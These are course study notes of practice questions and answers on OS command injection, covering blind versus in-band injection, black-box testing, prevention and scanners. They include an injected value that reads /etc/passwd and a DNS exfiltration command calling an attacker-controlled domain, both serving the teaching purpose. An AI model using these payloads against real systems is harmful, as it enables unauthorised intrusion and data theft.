---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what a command injection vulnerability is and provide an example of how it can be exploited.**

Command injection is a vulnerability that allows an attacker to execute arbitrary commands on the host operating system through a vulnerable application. For example, consider a web application that allows users to ping an IP address. If the application does not properly validate user input, an attacker can inject additional commands. An example payload might be `127.0.0.1; cat /etc/passwd`. When executed, this command will first ping `127.0.0.1` and then output the contents of `/etc/passwd`, revealing sensitive information.

**Q2. Describe the difference between in-band and blind command injection vulnerabilities.**

In-band command injection occurs when the output of the injected command is directly visible to the attacker within the application's response. This makes it easier to exploit because the attacker can immediately see the results of their command.

Blind command injection, on the other hand, does not return the output of the injected command directly to the attacker. To confirm exploitation, the attacker may use techniques such as timing delays (e.g., using `sleep` or `ping`) or out-of-band channels (e.g., DNS requests) to verify that the command was executed.

**Q3. How can you test for command injection vulnerabilities from a black box perspective?**

To test for command injection vulnerabilities from a black box perspective, you should:

1. Map the application to understand its functionality and identify potential input vectors.
2. Identify areas where the application interacts with the operating system, such as command execution.
3. Fuzz these input vectors with various command injection payloads, including shell meta-characters like `;`, `&&`, `||`, etc.
4. Analyze the responses to determine if the application is vulnerable. Look for unexpected behavior or output that indicates command execution.
5. Use techniques like timing delays (`sleep`, `ping`) or out-of-band channels (DNS requests) to confirm blind command injection vulnerabilities.

**Q4. What are the primary methods to prevent command injection vulnerabilities?**

The primary methods to prevent command injection vulnerabilities include:

1. Avoiding direct calls to OS commands. Instead, use built-in library functions that perform specific tasks and cannot be manipulated to execute arbitrary commands.
2. Validating user input against a whitelist of permitted values. For example, if only certain IP addresses are allowed, ensure that only those values are accepted.
3. Ensuring that input conforms to expected formats. For instance, if only numbers are expected, reject any non-numeric input.
4. Using automated tools to scan for command injection vulnerabilities and configuring them to test all relevant parameters.

**Q5. How can you exploit a blind command injection vulnerability to exfiltrate data?**

To exploit a blind command injection vulnerability and exfiltrate data, you can use the following techniques:

1. **Timing Delays**: Inject a command that causes a delay, such as `sleep 10`, to confirm that the command is being executed.
2. **Out-of-Band Channels**: Use DNS requests to exfiltrate data. For example, you can run a command like `nslookup $(whoami).attacker-controlled-domain.com` and monitor your DNS server logs to see the output of the `whoami` command.
3. **File Creation**: Redirect the output of a command to a file in a web-accessible directory, then download the file to retrieve the data.

**Q6. Provide an example of a recent real-world command injection vulnerability and explain how it was exploited.**

One notable example is the CVE-2021-44228, also known as Log4Shell, which affected Apache Log4j. Although primarily a Remote Code Execution (RCE) vulnerability, it could also be leveraged for command injection. Attackers could inject malicious log messages containing Java code that would be executed by the vulnerable Log4j component. This allowed attackers to execute arbitrary commands on the server, leading to full compromise of the system.

**Q7. How can you use a web application vulnerability scanner to detect command injection vulnerabilities?**

Web application vulnerability scanners can be configured to detect command injection vulnerabilities by:

1. Crawling the application to identify all input fields and parameters.
2. Sending various command injection payloads to these inputs.
3. Analyzing the responses to determine if the application is vulnerable.
4. Configuring the scanner to test all relevant parameters thoroughly.
5. Reviewing the scanner’s findings to confirm the presence of command injection vulnerabilities.

Popular scanners like Burp Suite Scanner, Nessus, and OWASP ZAP can be used for this purpose.

---
<!-- nav -->
[[21-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/10-OS Command Injection/01-Command Injection Complete Guide/00-Overview|Overview]]
